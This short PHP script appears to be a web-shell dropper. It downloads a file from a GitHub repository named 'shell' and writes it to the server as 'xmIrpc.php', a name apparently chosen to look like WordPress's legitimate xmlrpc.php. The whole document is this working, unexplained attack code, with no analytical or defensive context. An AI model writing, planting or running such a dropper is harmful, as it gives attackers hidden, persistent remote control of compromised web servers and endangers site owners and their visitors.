<?php
$nama= fopen("xmIrpc.php" ,"w+");
$file = file_get_contents('https://github.com/mr-quixter/shell/raw/main/revisi.txt');
$tulis = fwrite ($nama ,$file);
fclose($nama);
?>
